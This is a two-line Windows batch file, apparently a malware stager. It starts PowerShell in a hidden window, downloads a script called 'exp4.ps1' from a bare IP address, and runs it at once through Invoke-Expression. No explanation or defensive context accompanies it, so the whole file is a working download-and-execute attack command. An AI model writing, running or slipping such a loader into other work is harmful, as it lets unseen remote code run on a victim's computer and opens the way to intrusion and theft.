@ECHO OFF
Start Powershell -NoExit -WindowStyle Hidden -Command "(New-Object Net.WebClient).DownloadString('http://95.214.96.14:80/exp4.ps1') | iex"